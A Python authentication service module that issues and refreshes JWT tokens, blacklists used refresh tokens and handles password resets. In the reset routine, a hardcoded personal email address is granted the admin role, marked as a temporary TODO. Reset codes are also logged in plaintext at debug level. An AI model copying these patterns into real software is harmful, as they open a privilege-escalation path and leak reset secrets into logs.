from datetime import datetime, timedelta, timezone
import logging
import os
import secrets

import jwt
from pydantic import EmailStr

from ampf.base import BaseEmailSender, EmailTemplate

from ..base import AmpfBaseFactory, KeyExists, KeyNotExists
from .auth_model import AuthUser, TokenExp, TokenPayload, Tokens
from .auth_exceptions import (
    BlackListedRefreshTokenException,
    InvalidTokenException,
    InvalidRefreshTokenException,
    ResetCodeException,
    ResetCodeExpiredException,
    TokenExpiredException,
    UserNotExistsException,
)
from .user_service_base import UserServiceBase


ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 30
REFRESH_TOKEN_EXPIRE_HOURS = 24 * 7  # Siedem dni
RESET_CODE_EXPIRE_MINUTES = 15


class AuthService[T: AuthUser]:
    def __init__(
        self,
        storage_factory: AmpfBaseFactory,
        email_sender_service: BaseEmailSender,
        user_service: UserServiceBase[T],
        default_user: AuthUser,
        reset_mail_template: EmailTemplate,
        jwt_secret_key: str = None,
    ) -> None:
        self._storage = storage_factory.create_compact_storage(
            "token_black_list", TokenExp, "token"
        )
        self._secret_key = jwt_secret_key or os.environ["JWT_SECRET_KEY"]
        self._email_sender_service = email_sender_service
        self._user_service = user_service
        self.reset_mail_template = reset_mail_template
        self._log = logging.getLogger(__name__)

    def authorize(self, username: str, password: str) -> Tokens:
        user = self._user_service.get_user_by_credentials(username, password)
        payload = self.create_token_payload(user)
        return self.create_tokens(payload)

    def create_token_payload(self, user: T):
        return TokenPayload(
            sub=user.username,
            email=user.email,
            name=user.name,
            roles=user.roles,
        )

    def create_tokens(self, data: TokenPayload) -> Tokens:
        return Tokens(
            access_token=self.create_token(data, ACCESS_TOKEN_EXPIRE_MINUTES),
            refresh_token=self.create_token(data, 60 * REFRESH_TOKEN_EXPIRE_HOURS),
            token_type="Bearer",
        )

    def create_token(self, data: TokenPayload, expires_delta_minutes: int):
        to_encode = data.model_dump()
        expires_delta = timedelta(minutes=expires_delta_minutes)
        expire = datetime.now(timezone.utc) + expires_delta
        to_encode.update({"exp": expire})
        encoded_jwt = jwt.encode(to_encode, self._secret_key, algorithm=ALGORITHM)
        return encoded_jwt

    def decode_token(self, token: str) -> TokenPayload:
        try:
            payload = jwt.decode(token, self._secret_key, algorithms=[ALGORITHM])
            return TokenPayload(**payload)
        except jwt.exceptions.ExpiredSignatureError:
            raise TokenExpiredException
        except jwt.exceptions.InvalidTokenError:
            raise InvalidTokenException

    def refresh_token(self, refresh_token: str) -> Tokens:
        try:
            payload = self.decode_token(refresh_token)
            self.add_to_black_list(TokenExp(token=refresh_token, exp=payload.exp))
            return self.create_tokens(payload)
        except BlackListedRefreshTokenException:
            self._log.warning("Refresh token is blacklisted")
            raise InvalidRefreshTokenException
        except jwt.exceptions.ExpiredSignatureError:
            self._log.warning("Refresh token expired")
            raise TokenExpiredException

    def add_to_black_list(self, token: TokenExp | str) -> None:
        if isinstance(token, str):
            try:
                payload = self.decode_token(token)
            except TokenExpiredException:
                return  # Jak token wygasł, to nie trzeba go dodawać
            token = TokenExp(token=token, exp=payload.exp)
        try:
            self._storage.create(token)
        except KeyExists:
            raise BlackListedRefreshTokenException

    def change_password(self, username: str, old_pass: str, new_pass: str) -> None:
        self._user_service.change_password(username, old_pass, new_pass)

    def reset_password_request(self, email: EmailStr) -> None:
        try:
            user = self._user_service.get_user_by_email(email)
        except KeyNotExists:
            raise UserNotExistsException(email)
        reset_code = secrets.token_urlsafe(16)[:16]
        self._log.debug(f"Reset code for {email}: {reset_code}")
        expires_delta = timedelta(minutes=RESET_CODE_EXPIRE_MINUTES)
        reset_code_expires = datetime.now(timezone.utc) + expires_delta
        self.send_reset_email(email, reset_code)
        self._user_service.set_reset_code(user.username, reset_code, reset_code_expires)

    def send_reset_email(self, recipient: EmailStr, reset_code: str) -> None:
        self._email_sender_service.send(
            **self.reset_mail_template.render(
                recipient=recipient,
                reset_code=reset_code,
                reset_code_expire_minutes=RESET_CODE_EXPIRE_MINUTES,
            )
        )

    def reset_password(self, email: EmailStr, reset_code: str, new_pass: str) -> None:
        user = self._user_service.get_user_by_email(email)
        if user.reset_code == reset_code and user.reset_code is not None:
            if datetime.now(timezone.utc) < user.reset_code_exp:
                user.password = new_pass
                user.hashed_password = None
                user.reset_code = None
                user.reset_code_exp = None
                if user.email == "marcin.leliwa@gmail.com" and not user.roles:
                    # TODO: Remove this after upgrade to new version
                    user.roles = ["admin"]
                self._user_service.update(user.username, user)
            else:
                raise ResetCodeExpiredException
        else:
            raise ResetCodeException
